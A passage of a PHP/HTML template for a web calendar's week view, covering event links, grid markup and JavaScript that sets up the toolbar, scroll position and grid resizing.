								href='<?php echo cal_getlink("index.php?action=viewevent&amp;view=week&amp;id=".$event->getId())."&amp;user_id=".$user_filter;?>'
								onclick="stopPropagation(event);"
								class='internalLink'><div style="color:<?php echo $txt_color?>!important;padding-left:5px;font-size:93%;"><?php echo $subject;?></div></a>
							</div>
							</dd>
							<?php } //if ?>
						</dl>
						</div>
						<div class="b2 <?php echo  $ws_class?>" style="<?php echo  $ws_style?>;margin:0px 1px 0px 1px;height:1px; border-left:1px solid;border-right:1px solid; border-color:<?php echo $border_color ?>">
						</div>
						<div class="b1 <?php echo  $ws_class?>" style="<?php echo  $ws_style?>;margin:0px 2px 0px 2px;height:0px; border-top:1px solid; border-color:<?php echo $border_color ?>">
						</div>
						</div>
<?php												}//foreach ?>
											</div>
<?php										}//day of week ?>
										</div>
									</td>
									<td id="ie_scrollbar_adjust" style="width:0px;"></td>
								</tr>
							</table>
						</div><!--calowner -->															 
				</div><!--gridcontainer -->
				
			</div>		
			
			</td>
			</tr>
		</table>
	</td>
</tr>
</table>
</div>

<?php
	$wdst = user_config_option('work_day_start_time', '09:00');
	$h_m = explode(':', $wdst);
	if (str_ends_with($wdst, 'PM')) {
		$h_m[0] = ($h_m[0] + 12) % 24;
		$h_m[1] = substr($h_m[1], 0 , strpos(' ', $h_m[1]));
	}
	$defaultScrollTo = PX_HEIGHT * ($h_m[0] + ($h_m[1] / 60));
 ?>


<script type="text/javascript">
	// Top Toolbar	
	ogCalendarUserPreferences = Ext.util.JSON.decode(document.getElementById('hfUserPreferences').value);
	var ogCalTT = new og.CalendarTopToolbar({
		usersHfId:'hfUsers',
		companiesHfId:'hfCompanies',
		renderTo:'calendarPanelTopToolbar'
	});	

	// Mantain the actual values after refresh by clicking Calendar tab.
	var dtv = new Date('<?php echo $month.'/'.$day.'/'.$year ?>');
	calToolbarDateMenu.picker.setValue(dtv);

	// scroll to first event
	var scroll_pos = (scroll_to == -1 ? <?php echo $defaultScrollTo ?> : scroll_to);
	Ext.get('gridcontainer').scrollTo('top', scroll_pos, true);
	
	if (Ext.isIE) document.getElementById('ie_scrollbar_adjust').style.width = '15px';
	
	// resize grid
	function resizeGridContainer(e, id) {
		maindiv = document.getElementById('cal_main_div');
		if (maindiv == null) {
			og.removeDomEventHandler(window, 'resize', id);
		} else {
			var divHeight = maindiv.offsetHeight;
			divHeight = divHeight - 30 - <?php echo (PX_HEIGHT + $alldaygridHeight); ?>;
			document.getElementById('gridcontainer').style.height = divHeight + 'px';
		}
	}
	resizeGridContainer();
	if (Ext.isIE) {
		og.addDomEventHandler(document.getElementById('cal_main_div'), 'resize', resizeGridContainer);
	} else {
		og.addDomEventHandler(window, 'resize', resizeGridContainer);
	}
	
	// init tooltips
	Ext.QuickTips.init();
</script>
